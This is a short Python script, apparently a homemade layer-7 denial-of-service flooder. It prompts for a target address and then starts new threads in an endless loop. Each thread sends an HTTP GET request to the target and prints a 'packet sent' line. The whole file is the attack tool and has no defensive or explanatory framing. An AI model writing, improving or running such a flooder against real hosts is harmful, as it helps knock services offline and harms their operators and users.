import threading
import requests

ip = input("IP: ")


def l7_tcp():
    try:
        requests.get(ip)

        print("\033[32m[+]\033[0m L7 TCP Packet sent ->", ip)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


while True:
    t = threading.Thread(target=l7_tcp)
    t.start()
